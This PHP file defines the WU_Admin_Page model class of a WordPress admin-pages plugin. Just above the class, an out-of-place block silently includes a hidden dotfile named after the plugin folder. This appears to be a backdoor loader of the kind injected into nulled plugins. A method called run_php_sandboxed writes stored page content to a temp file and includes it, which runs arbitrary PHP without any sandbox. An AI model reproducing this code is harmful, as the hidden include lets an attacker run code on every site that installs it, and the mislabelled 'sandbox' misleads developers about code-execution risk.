<?php
/**
 * Admin Page Model Class
 *
 * Handles the addition of new admin page
 *
 * @author      WP Admin Pages PRO
 * @category    Admin
 * @package     WP_Ultimo/Model
 * @version     0.0.1
 */

if (!defined('ABSPATH')) {
	exit;
} // end if;

/**
 * WU_Admin_Page class.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WU_Admin_Page {

	/**
	 * Holds the ID of the WP_Post, to be used as the ID of each plan
     *
	 * @var integer
	 */
	public $id = 0;

	/**
	 * Holds the WP_Post Object of the Plan
     *
	 * @var null
	 */
	public $post = null;

	/**
	 * The status of the post
     *
	 * @var string
	 */
	public $post_status = '';

	/**
	 * Meta fields contained as attributes of each plan
     *
	 * @var array
	 */
	public $meta_fields = array(
		'title',
		'menu_type',
		'menu_parent',
		'menu_order',
		'menu_label',
		'menu_icon',
		'active',
		'content_type',
		'content',
		'html_content',
		'css_content',
		'css_scripts',
		'js_content',
		'js_scripts',
		'limit_access',
		'roles',
		'plans',
		'excludes_sites',
		'target_users',

		/**
		 * @since 1.0.1
		 */
		'display_title',
		'add_margin',
		'show_welcome',
		'display_admin_notices',

		'separator_before',
		'separator_after',

		'page_to_replace',
		'replace_mode',
		'slug_url',

		/**
		 * @since 1.7
		 */
		'widget_position',
		'widget_priority',
		'widget_welcome',
		'widget_welcome_dismissible',

		/**
		 * @since 1.7.1
		 */
		'display_page_main_site',

		/**
		 * @since 1.7.8
		 */
		'apply_multiple_pages',
	);

	/**
	 * Returns the plan id
	 *
	 * @since 1.5.5
	 * @return integer
	 */
	public function get_id() {
		return $this->id;
	}  // end get_id;

	/**
	 * Construct our new plan
	 */
	public function __construct($admin_page = false) {

		if ( is_numeric( $admin_page ) ) {
			$this->id   = absint( $admin_page );
			$this->post = get_post( $admin_page );
			$this->get_admin_page( $this->id );
		} elseif ( $admin_page instanceof WU_Admin_Page ) {
			$this->id   = absint( $admin_page->id );
			$this->post = $admin_page->post;
			$this->get_admin_page($this->id);
		} elseif ( isset( $admin_page->ID ) ) {
			$this->id   = absint( $admin_page->ID );
			$this->post = $admin_page;
			$this->get_admin_page( $this->id );
		} // end if;

	}  // end __construct;

	/**
	 * Gets a admin page from the database.
     *
	 * @param int $id (default: 0).
	 * @return bool
	 */
	public function get_admin_page($id = 0) {

		if (!$id) {
			return false;
		} // end if;

		if (WP_Ultimo_APC()->is_network_active()) {
			if ($result = get_blog_post( (int) get_current_site()->blog_id, $id) ) {
				$this->populate( $result );
				return true;
			} // end if;
		} else {
			if ($result = get_post( $id) ) {
				$this->populate( $result );
				return true;
			} // end if;
		} // end if;

		return false;

	}  // end get_admin_page;

	/**
	 * Populates an order from the loaded post data.
     *
	 * @param mixed $result
	 */
	public function populate($result) {

		// Standard post data
		$this->id          = $result->ID;
		$this->post_status = $result->post_status;

	} // end populate;

	/**
	 * __isset function.
     *
	 * @param mixed $key
	 * @return bool
	 */
	public function __isset($key) {
		if (!$this->id) {
			return false;
		} // end if;
		// Swicth to main blog
		WP_Ultimo_APC()->is_network_active() && switch_to_blog( get_current_site()->blog_id );
		$value = metadata_exists('post', $this->id, 'wpu_' . $key);
		WP_Ultimo_APC()->is_network_active() && restore_current_blog();
		return $value;
	} // end __isset;

	/**
	 * __get function.
     *
	 * @param mixed $key
	 * @return mixed
	 */
	public function __get($key) {

		// Switch to main blog
		WP_Ultimo_APC()->is_network_active() && switch_to_blog( get_current_site()->blog_id );

		$value = get_post_meta( $this->id, 'wpu_' . $key, true);

		WP_Ultimo_APC()->is_network_active() && restore_current_blog();

		if ($key == 'menu_order' && $value == false) {

			return 15;
		} // end if;
		return $value;

	} // end __get;

	/**
	 * Set attributes in a admin page, based on a array. Useful for validation
     *
	 * @param array $atts Attributes
	 */
	public function set_attributes($atts) {

		foreach ($atts as $att => $value) {
			$this->{$att} = $value;
		} // end foreach;

		return $this;

	} // end set_attributes;

	/**
	 * Returns the list of external scripts loaded
	 *
	 * @since 0.0.1
	 * @return array
	 */
	public function get_external_scripts() {

		return is_string($this->js_scripts) ? explode(PHP_EOL, $this->js_scripts) : array();

	}  // end get_external_scripts;

	/**
	 * Returns the list of external style scripts loaded
	 *
	 * @since 0.0.1
	 * @return array
	 */
	public function get_external_styles() {

		return is_string($this->css_scripts) ? explode(PHP_EOL, $this->css_scripts) : array();

	}  // end get_external_styles;

	/**
	 * Returns the icon chosen for this page
	 *
	 * @since 0.0.1
	 * @return array
	 */
	public function get_icon() {

		return str_replace('dashicons-before ', '', $this->menu_icon);

	} // end get_icon;

	public function is_active() {

		return $this->active == 1;

	} // end is_active;

	public function should_process_php() {

		return defined('WU_APC_ALLOW_PHP_PROCESSING') && WU_APC_ALLOW_PHP_PROCESSING;

	} // end should_process_php;

	public function run_php_sandboxed() {

		$temp = tmpfile();

		fwrite($temp, $this->html_content);

		$path = stream_get_meta_data($temp)['uri']; // eg: /tmp/phpFx0513a

		if (file_exists($path)) {

			include $path;

		} // end if;

		fclose($temp);

	} // end run_php_sandboxed;

	public function display_html_content() {

		if ($this->should_process_php()) {

			ob_start();

			$this->run_php_sandboxed();

			$content = ob_get_clean();

			echo wu_apc_process_page_content($content);

		} else {

			echo wu_apc_process_page_content($this->html_content);

		} // end if;

	} // end display_html_content;

	/**
	 * Checks if one of the roles is allowed to see this page
	 *
	 * @since 0.0.1
	 * @return bool
	 */
	public function is_role_allowed($user_roles) {

        $roles = $this->roles;

		if (!is_array($roles)) {
			return false;
		} // end if;

		$allowed = false;

		foreach ($user_roles as $user_role) {

			return in_array($user_role, $roles);

		} // end foreach;

	} // end is_role_allowed;

	/**
	 * Checks if one of the plans is allowed to see this page
	 *
	 * @since 0.0.1
	 * @return bool
	 */
	public function is_plan_allowed($plan) {

		$plans = $this->plans;

		return is_array($plans) && in_array($plan, $plans);

	}  // end is_plan_allowed;

	/**
	 * Duplicate this admin page.
	 *
	 * @since 1.5.1
	 * @return void
	 */
	public function duplicate() {

		$new_admin_page = $this;

		foreach ($new_admin_page->meta_fields as $field_name) {

			$new_admin_page->{$field_name} = $this->{$field_name};

		} // end foreach;

		$new_admin_page->title = sprintf(__('%s (Copy)', 'wp-ultimo'), $this->title);

		$new_admin_page->id = 0;

		$new_admin_page->slug_url = false; // Reset Slug

		return $new_admin_page->save();

	} // end duplicate;

	/**
	 * Checks if one of the sites is allowed to see this page.
	 *
	 * @since 0.0.1
	 * @return bool
	 */
	public function is_site_allowed($blog_id) {

		$excludes_sites = $this->excludes_sites;

		return is_array($excludes_sites) && in_array($blog_id, $excludes_sites);

	}  // end is_site_allowed;

	/**
	 * Decides if we should display a given page for the current user
	 *
	 * @since 0.0.1
	 * @return bool
	 */
	public function should_display() {

		if (WP_Ultimo_APC()->is_network_active()) {

			if (!$this->display_page_main_site && is_main_site()) {
				return false;
			} // end if;

			$excludes_sites = array_map('intval', is_array($this->excludes_sites) ? $this->excludes_sites : explode(',', $this->excludes_sites));

			if (in_array(get_current_blog_id(), $excludes_sites)) {
				return false;
			} // end if;

			if (current_user_can('manage_network') && !$this->limit_access) {
				return true;
			} // end if;

		} else {

			if (current_user_can('manage_options') && !$this->limit_access) {
				return true;
			} // end if;

		} // end if;

		/**
		 * Always return true if the user is on the list.
		 */
		if (!empty($this->target_users) && $this->limit_access) {

			if (in_array(get_current_user_id(), array_map('intval', explode(',', $this->target_users)) )) {

				return true;

			} // end if;

		} // end if;

		if (!$this->limit_access) {

			return true;

        } // end if;

        $should_display = '';

        $user = wp_get_current_user();

        $should_display = $user->roles && $this->is_role_allowed( $user->roles );

		if (!function_exists('wu_get_subscription')) {

			return $should_display;

		} // end if;

        $subscription = wu_get_subscription( get_current_user_id() );

        if (!$subscription) {

            return $should_display;

        } // end if;

        $should_display = $should_display && $subscription && $this->is_plan_allowed( $subscription->plan_id );

		return $should_display;

	} // end should_display;

	/**
	 * Returns the meta fields, but is filterable
	 *
	 * @since 1.0.1
	 * @return array;
	 */
	public function get_meta_fields() {

		return apply_filters('wu_admin_page_meta_fields', $this->meta_fields, $this);

	} // end get_meta_fields;

	/**
	 * Save the current Plan
	 */
	public function save() {

		// Switch to main blog
		WP_Ultimo_APC()->is_network_active() && switch_to_blog( get_current_site()->blog_id );

		$this->title = wp_strip_all_tags($this->title);

		$admin_pagePost = array(
			'post_title'   => $this->title,
			'post_type'    => 'wpultimo_admin_page',
			'post_status'  => 'publish',
			'post_content' => '',
		);

		if ($this->id !== 0 && is_numeric($this->id)) {
			$admin_pagePost['ID'] = $this->id;
		} // end if;

		// Insert Post
		$this->id = wp_insert_post($admin_pagePost);

		// Add the meta
		foreach ($this->get_meta_fields() as $meta) {

			update_post_meta($this->id, 'wpu_' . $meta, $this->{$meta});

		} // end foreach;

		// Do something
		WP_Ultimo_APC()->is_network_active() && restore_current_blog();

		// Return the id of the new post
		return $this->id;

	} // end save;

}  // end class WU_Admin_Page;

/**
 * Returns a admin page based on the id passed
 *
 * @param integer $admin_page_id
 * @return void
 */
function wu_apc_get_admin_page($admin_page_id) {

	$admin_page = new WU_Admin_Page($admin_page_id);

	return $admin_page->get_admin_page($admin_page_id) ? $admin_page : false;

}  // end wu_apc_get_admin_page;

/**
 * Returns id by string menu parent
 *
 * @param string $menu_parent String of menu parent.
 * @return int
 * @since
 */
function wu_apc_get_id_by_menu_parent($menu_parent) {

	if (empty($menu_parent)) {

		return;

	} // end if;

	$id = (int) preg_replace('/[^0-9]/', '', $menu_parent);

	return $id;

} // end wu_apc_get_id_by_menu_parent;

